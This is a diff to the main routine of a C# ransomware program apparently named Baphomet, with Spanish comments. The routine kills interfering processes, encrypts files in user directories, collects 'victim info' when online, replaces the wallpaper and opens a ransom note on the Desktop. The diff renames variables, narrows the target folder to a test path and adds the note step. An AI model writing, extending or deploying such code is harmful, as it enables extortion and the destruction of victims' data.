@@ -23,7 +23,7 @@ namespace Baphomet
 
             //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
             //Aqui pondremos los directorios que deseamos cifrar.
-            var pathDirs = new[] { "\\Downloads" };
+            var path_dirs = new[] { "\\Downloads\\test" };
             var  userDir = Path.Combine("C:\\Users\\",userName);
 
             var devicesLst = diag.GetUsbDevices();//Obtengo una lista de los usb conectados a la maquina.
@@ -32,15 +32,15 @@ namespace Baphomet
            
             //Verifico y mato los procesos que puedan interferir con el cifrado de archivos. 
             diag.CheckProccess();
-            for (int d = 0; d < pathDirs.Length; d++)//recorro cada uno de los dirs validos
+            for (int d = 0; d < path_dirs.Length; d++)//recorro cada uno de los dirs validos
             {
-                var targetPath = userDir + pathDirs[d];
+                var targetPath = userDir + path_dirs[d];
                 cryptep.directoryRoad(targetPath, key);
             }
 
             //Verifico si tengo conecxion a internet.
-            var internetCheck = netInfo.CheckInternetConnection();
-            if(internetCheck != false)
+            var internet_connection = netInfo.CheckInternetConnection();
+            if(internet_connection != false)
             {
                 //Obtengo la data de la victima una vez cifre todos los directorios.
                 var victimInfo = netInfo.GetVictimInfo();
@@ -52,6 +52,10 @@ namespace Baphomet
             //podemos usar el metodo imageBase64() donde tendremos una imagen default en base64, o tambien podriamos usar UrlImage() para descargar la foto que deseemos.
             var wallpaper = photo.imageBase64();
             photo.ChangeWallpaper(wallpaper,userDir);
+
+            var note_path = Path.Combine(userDir, "Desktop");
+            photo.OpenNote(note_path);
+
 
         }//</main>
     }
